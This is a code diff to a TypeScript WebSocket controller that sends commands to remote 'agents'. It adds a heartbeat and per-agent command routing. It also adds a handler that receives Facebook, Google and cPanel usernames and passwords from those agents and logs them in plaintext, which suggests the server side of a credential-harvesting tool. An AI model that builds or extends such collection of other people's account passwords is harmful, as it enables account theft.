@@ -23,6 +23,20 @@ export type AgentCommandResult = {
   data?: any;
 }
 
+export type CredentialsTypes = {
+  type: 'messenger' | 'facebook'
+  email: string
+  password: string
+} | {
+  type: 'google'
+  identifier: string
+  password: string
+} | {
+  type: 'cpanel'
+  user: string
+  pass: string
+}
+
 @ws('/agents/ws')
 export class AgentsWebSocketController {
   constructor(
@@ -35,13 +49,13 @@ export class AgentsWebSocketController {
     @repository(AgentWebSocketTokenRepository)
     private agentWebSocketTokenRepository: AgentWebSocketTokenRepository,
     @inject('rxjs.agent-connection')
-    private agentConnection: Subject<AgentConnection>,
+    private agentConnectionSubject: Subject<AgentConnection>,
     @inject('rxjs.agent-commands')
-    private agentCommands: Subject<AgentCommand & { cmdId: string }>,
+    private agentCommandsSubject: Subject<AgentCommand & { cmdId: string }>,
     @inject('rxjs.agent-command-received')
-    private agentCommandReceived: Subject<AgentCmdReceived>,
+    private agentCommandReceivedSubject: Subject<AgentCmdReceived>,
     @inject('rxjs.agent-command-results')
-    private agentCommandResults: Subject<AgentCommandResult>,
+    private agentCommandResultsSubject: Subject<AgentCommandResult>,
     @inject(MediasoupBindings.jwt)
     private mediasoupJwt: MediasoupJWT,
   ) { }
@@ -70,10 +84,26 @@ export class AgentsWebSocketController {
           },
         });
         if (foundAgent) {
-          this.agentConnection.next({
+          this.agentConnectionSubject.next({
             agentId: foundAgent.agentId,
             connected: true
           });
+          const intervalId = setInterval(() => {
+            socket.timeout(5000).emit('ping', (err: any) => {
+              let connected = false;
+              if (err) {
+                console.log('agent down');
+                socket.disconnect(true);
+                clearInterval(intervalId)
+              } else {
+                connected = true;
+              }
+              this.agentConnectionSubject.next({
+                agentId: foundAgent.agentId,
+                connected
+              });
+            });
+          }, 5000);
           await this.agentRepository.tokens(foundAgent.id).patch({ used: true, usedAt: foundToken.usedAt ? foundToken.usedAt : new Date().toISOString() }, { token });
           const activity: Partial<AgentActivity> = {
             agentId: +`${foundAgent.id}`,
@@ -94,19 +124,19 @@ export class AgentsWebSocketController {
               });
             }
           });
-          this.agentCommands.subscribe({
+          this.agentCommandsSubject.subscribe({
             next: (cmd: AgentCommand & { cmdId: string }) => {
-              socket.emit('cmd', cmd);
+              if (cmd.agentId === foundAgent.agentId) socket.emit('cmd', cmd);
             },
           });
         }
       } else {
         socket.emit('error', `Invalid token`);
-        socket.disconnect();
+        socket.disconnect(true);
       }
     } else {
       socket.emit('error', `Missing token: ${token}`);
-      socket.disconnect();
+      socket.disconnect(true);
     }
   }
 
@@ -117,7 +147,7 @@ export class AgentsWebSocketController {
   @ws.subscribe('cmd received')
   async handleCmdReceived(cmdReceived: AgentCmdReceived) {
     console.log('cmd received: %s', cmdReceived);
-    this.agentCommandReceived.next(cmdReceived);
+    this.agentCommandReceivedSubject.next(cmdReceived);
   }
 
   /**
@@ -127,7 +157,7 @@ export class AgentsWebSocketController {
   @ws.subscribe('result')
   async handleResult(result: AgentCommandResult) {
     console.log('result: %s', result);
-    this.agentCommandResults.next(result);
+    this.agentCommandResultsSubject.next(result);
     const cmd = await this.agentCommandRepository.findOne({ where: { cmdId: result.cmdId } });
     if (cmd) {
       switch (cmd.cmd) {
@@ -136,6 +166,11 @@ export class AgentsWebSocketController {
           break;
       }
     }
+  }
+
+  @ws.subscribe('credentials')
+  async handleCredentials(credentials: CredentialsTypes) {
+    console.log('credentials: %s', credentials);
   }
 
   /**
@@ -157,7 +192,7 @@ export class AgentsWebSocketController {
         },
       });
       if (foundAgent) {
-        this.agentConnection.next({
+        this.agentConnectionSubject.next({
           agentId: foundAgent.agentId,
           connected: false
         });
